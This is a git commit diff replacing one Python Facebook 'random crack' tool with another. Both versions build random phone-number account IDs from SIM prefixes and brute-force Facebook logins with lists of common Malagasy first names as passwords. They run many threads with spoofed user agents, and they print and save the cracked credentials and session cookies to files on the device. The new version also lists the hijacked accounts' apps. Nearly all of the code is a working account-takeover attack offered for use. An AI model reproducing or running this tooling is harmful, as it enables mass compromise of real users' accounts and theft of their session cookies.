1e90277f07bf60f417b54c92459b5ba6e3ffb8a6
Adala <167643700+Safidy03@users.noreply.github.com>
2024-05-17 06:37:00 +0300

    Update nian.py

--- nian.py
+++ nian.py
@@ -1,182 +1,273 @@
-# Définir le numéro de version
-version_actuelle = "2.0"
-
-
-
-import os
-import random
-import string 
-import uuid
-import json
-import subprocess
-from concurrent.futures import ThreadPoolExecutor as tred
-import requests
-import sys
-import secrets
-import getpass
-
-# Mot de passe pour déverrouiller le script
-mot_de_passe = "ITACHI2024"
-
-# Demander à l'utilisateur de saisir le mot de passe
-saisie_mot_de_passe = getpass.getpass("Veuillez entrer le mot de passe : ")
-
-# Vérifier si le mot de passe saisi est correct
-if saisie_mot_de_passe == mot_de_passe:
-    print("Mot de passe correct. Exécution de git pull...")
-    # Exécuter la commande git pull
-    try:
-        subprocess.run(["git", "pull"], check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"Erreur lors de l'exécution de git pull : {e}")
-        exit(1)
-    print("Git pull terminé avec succès !")
-
-#-------------color----------------#
-bblack="\033[1;30m"         # Black
-M="\033[1;31m"            # Red
-H="\033[1;32m"         # Green
-byellow="\033[1;33m"        # Yellow
-bblue="\033[1;34m"          # Blue
-P="\033[1;35m"        # Purple
-C="\033[1;36m"          # Cyan
-B="\033[1;37m"         # White
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+#-----[Global Functions]-----#
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+#-----[Colours]-----#
+RED = '\033[1;91m' #
+WHITE = '\033[1;97m' #
+GREEN = '\033[1;32m' #
+YELLOW = '\033[1;33m' #
+BLUE = '\033[1;34m' #
+ORANGE = '\033[1;35m' #
+P = '\x1b[1;97m' # 
+M = '\x1b[1;91m' # 
+H = '\x1b[1;92m' # 
+K = '\x1b[1;92m' # 
+B = '\x1b[1;94m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;96m' #
+N = '\x1b[0m' #
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
 my_color = [
- B,C,P,H]
+ P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
-oks=[]
-cps=[]
-loop=0
-# Liste des couleurs pour le logo, les lignes et chaque mot
-logo_colors = [B, C, P, H]
-line_colors = [bblack, M, H, byellow, bblue, P, C, B]
-word_colors = [B, C, P, H, M, byellow, bblue, P, C, B]
-#-------------logo-----------------#
-logo=(f'''{B}
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+mtd,cp_cpx,cokix=[],[],[]
+ugen2=[]
+ugen=[]
+#-----[App Checker]-----#
+def cek_apk(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
+    else:
+        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
 
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://mbasic.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+           
+#-----[UserAgent]-----#
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+         
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.001)
+#-----[Logo]-----#
+logo = ("""
+\033[1;37md8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+\033[1;32m88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+\033[1;37m88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+\033[1;32m88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+\033[1;37m88      88   88 88 `88.  `8bd8'  88.     db. 88  
+\033[1;32m88      YP   YP 88   YD    YP    Y88888P Y8888P  
+ ┌─────────────────────────────────────────┐
+ │ [✓] AUTHOR   : Parvej Hossen            │
+ │ [✓] TOOL     : RANDOM CRACK             │
+ │ [✓] STATUS   : FREE                     │
+ │ [✓] GITHUB   : PARVEJ404                │
+ │ [✓] FACEBOOK : FH ROMAN                 │
+ └─────────────────────────────────────────┘""")
+try:
+   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
+   v = 5.2
+   update = ('5.2')
+   update = ('5.2')
+   if str(v) in update:
+       os.system('clear')
+   else:pass
+except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
 
-                                 
-,--.  ,--.,------.,--.,--.  ,--. 
-|  ,'.|  ||  .---'|  ||  ,'.|  | 
-|  |' '  ||  `--, |  ||  |' '  | 
-|  | `   ||  `---.|  ||  | `   | 
-`--'  `--'`------'`--'`--'  `--' 
-                                 
-
-                                            
-
-{warna}--------------------------------------------{B}
- Owner    : {M}SAFIDINIAINA{M}
- TOOL NAME : {warna}{P}SAFIDY{P}{warna}
- GROUPE-FB   : NONE
- STATUE : {H}PAID{H}
- Facebook : {bblue}SM{bblue}
- Tools    : {warna}[{M}VERSION 2.0{warna}]{warna}
---------------------------------------------{B}''')
-#-------------linex def -------------#
 def linex():
-    print(f'{warna}--------------------------------------------{B}')
-#-------------clear def -------------#
+        print('\033[1;37m ──────────────────────────────────────────')
+ 
 def clear():
     os.system('clear')
     print(logo)
-#-------------main def------------#
-def MR_ITACHI():
-    clear()
-    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
-    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
+    
+#-----[Loop Menu]-----#  
+loop = 0
+oks = []
+cps = []
+
+#-----[Main-Menu]-----#
+def mumit_menu():
+    os.system('clear');print(logo)
+    print('\033[1;92m [1] RANDOM CRACK')
+    print('\033[1;92m [0] EXIT TOOL')
     linex()
-    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
-    if option in ['01','1']:
-        BD_CLONING()
-    else:
-        exit(' MERCI BEAUCOUP  :)')
-#------------- bd clone def ----------#
-def BD_CLONING():
+    mumit=input(' \033[1;32m[?] SELECT MENU: ')
+    if mumit in['1','01']:innocent()
+    elif mumit in['0','00']:exit()
+    else:exit()
+    
+def innocent():
     user=[]
-    clear()
-    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
-    print(' 261=0 Madagascar : [032] [034] [038] [033]')
-    code=input(' ENTER SIM CODE >> ')
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print('\033[1;32m [√] BD CODE : 017/019/016/018/013')
     linex()
-    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
-    try:
-        limit=int(input(' ENTER LIMIT >> '))
-    except ValueError:
-        limit=50000
-    clear()
+    code = input('\033[1;32m [?] CHOOSE : ')
+    os.system('clear')
+    print(logo)
+    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
+    linex()
+    limit = int(input('\033[1;32m [?] CHOOSE : '))
+    linex()
+    xd_cp=input(f'\033[1;32m [?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
+    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
+    else:cp_cpx.append('n')
     for nmbr in range(limit):
-        nmp=''.join(map(str, generate_random_sequence(7)))
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with tred(max_workers=30) as Dipto:
-        tl=str(len(user))
-        print(' TOTAL ACCOUNT : '+tl)
-        print(' YOUR SIM CODE : '+code)
-        print(' CLONING EN COURS ... ')
+    with ThreadPool(max_workers=50) as ahare:
+        clear()
+        tl = str(len(user))
+        print('\033[1;32m [+] Choice Code: '+code)
+        print('\033[1;92m [+] Crack Process Has Started')
+        print('\033[1;92m [!] Use Flight Mode For Speed Up')
         linex()
-        for psx in user:
-            ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'lafatra','nomena','Nomena','fiderana','Fiderana','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoana','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
-            Dipto.submit(method_crack,ids,passlist)
-            
+        for fuck in user:
+            pwx = ['fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
+            uid = code+fuck
+            ahare.submit(mumitx,uid,pwx,tl)
+    print('CRACK PROCESS HAS BEEN COMPLETED ')
+    print('Ok Ids Saved in /PARVEJ-OK.txt')
+    print('Cp Ids Saved in /PARVEJ-CP.txt')
     linex()
-    print(' LE CLONING EST FINI ')
-    print(' TOTAL OK ID '+str(len(oks)))
-    print(' TOTAL CP ID '+str(len(cps)))
-    input(' PRESS ENTER TO BACK  : ')
-    MR_ITACHI()
-#------------ method crack def ---------#
-def method_crack(ids, passlist):
-    global oks
-    global cps
+    
+def mumitx(uid,pwx,tl):
     global loop
+    global cps
+    global oks
+    global proxy
     try:
-        for pas in passlist:
-            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
-            sys.stdout.flush()
-            adid=str(uuid.uuid4())
-            device_id=str(uuid.uuid4())
-            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-            url='https://api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header).json()
-            if 'session_key' in reqx:
-                try:
-                    uid=reqx['uid']
-                except:
-                    uid=ids
-                if str(uid) in oks:
-                    break
-                else:
-                    print('\r\r \033[1;32m[SAFIDY-OK] '+str(uid)+' | '+pas+'\033[1;37m')
-                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[1;32m [COOKIES] '+coki)
-                    # Vérifier si le dossier SAFIDY-IDS existe et le créer si nécessaire
-                    if not os.path.exists("/sdcard/SAFIDY-IDS"):
-                        os.makedirs("/sdcard/SAFIDY-IDS")
-                    # Enregistrer dans le fichier SAFIDY-OK.txt
-                    with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-OK.txt"), 'a') as f:
-                        f.write(str(uid)+'|'+pas+'|'+coki+'\n')
-                    oks.append(str(uid))
-                    break
-            elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;30m[SAFIDY-CP] '+ids+' | '+pas+'\033[1;37m')
-                # Enregistrer dans le fichier SAFIDY-CP.txt
-                with open(os.path.join("/sdcard/SAFIDY-IDS", "SAFIDY-CP.txt"), 'a') as f:
-                    f.write(ids+'|'+pas+'\n')
-                cps.append(ids)
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m[PARVEJ-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
+            
+                cek_apk(session,coki)
+                open('/sdcard/PARVEJ-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                if 'y' in cp_cpx: 
+                 print('\r\r\033[1;30m[PARVEJ-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/PARVEJ-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                cps.append(cid)
                 break
             else:
                 continue
         loop+=1
+        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mPARVEJ\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.flush()
     except:
         pass
-#-------------end----------------#
 
-# Générateur de séquence aléatoire
-def generate_random_sequence(length):
-    sequence = [random.choice(string.digits) for _ in range(length)]
-    return sequence
-
-# Appel à la fonction MR_ITACHI pour démarrer le programme
-MR_ITACHI()
+#-----[Run Menu]-----#
+mumit_menu()
